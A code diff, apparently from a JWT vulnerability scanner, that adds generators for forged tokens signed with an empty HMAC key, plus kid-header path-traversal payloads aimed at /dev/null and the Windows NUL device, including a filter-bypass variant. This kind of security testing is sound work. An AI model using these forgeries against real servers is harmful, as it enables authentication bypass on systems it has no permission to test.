@@ -135,4 +135,53 @@ QStringList algNoneVariants(const JwtTool::Decoded &d) {
     return out;
 }
 
+// The HS family -- empty-key forgeries span all three so a server configured to
+// HS384/HS512 (not just HS256) is still covered (signHmac dispatches on the
+// header alg). Hardcoding HS256 would silently miss an HS384/512 victim.
+static const char *kHsAlgs[] = { "HS256", "HS384", "HS512" };
+
+// HMAC forgeries signed with an EMPTY key, one per HS alg. A server whose JWT
+// signing secret is unset/blank (a real misconfig) HMAC-verifies one of these.
+// Distinct from the weak-secret dictionary crack: "" is not a dictionary word and
+// no crack is needed -- the key is known to be empty. alg is forced to the HS
+// family so the test applies even to a captured RS/ES token (HMAC fall-back).
+QStringList blankSecretVariants(const JwtTool::Decoded &d) {
+    QStringList out;
+    for (const char *a : kHsAlgs) {
+        QJsonObject h = d.header;
+        h["alg"] = QString::fromLatin1(a);
+        out << JwtTool::signHmac(h, d.payload, QByteArray());
+    }
+    return out;
+}
+
+// `kid` header-injection forgeries. A malicious kid points the server's key
+// LOOKUP at content the attacker controls; the canonical case is a path traversal
+// to an empty/predictable file -- /dev/null or the Windows NUL device -- whose
+// bytes are the EMPTY string, so the token is HMAC-signed with an empty key.
+// A server that resolves kid to a file path and HMACs with its bytes then
+// verifies our forgery. Variants cover plain and "..//"-doubled traversals plus
+// the absolute device paths, each across the HS family. Claims are preserved (so
+// the accept grading -- which compares the response to the valid baseline -- holds).
+// NOTE: these share the empty key with blankSecretVariants(); the probe fires the
+// kid finding only DIFFERENTIALLY (a kid token accepted while the no-kid empty-key
+// token is rejected) so a plain blank-secret server isn't mislabeled as kid-driven.
+QStringList kidInjectionVariants(const JwtTool::Decoded &d) {
+    static const char *kKids[] = {
+        "../../../../../../../../../../dev/null",
+        "/dev/null",
+        "....//....//....//....//....//dev/null",   // bypass a naive single "../" strip
+        "..\\..\\..\\..\\..\\..\\..\\..\\NUL",        // Windows null device
+    };
+    QStringList out;
+    for (const char *kid : kKids)
+        for (const char *a : kHsAlgs) {
+            QJsonObject h = d.header;
+            h["alg"] = QString::fromLatin1(a);
+            h["kid"] = QString::fromLatin1(kid);
+            out << JwtTool::signHmac(h, d.payload, QByteArray());   // empty key == null-file contents
+        }
+    return out;
+}
+
 } // namespace Nullock::Core::JwtProbe
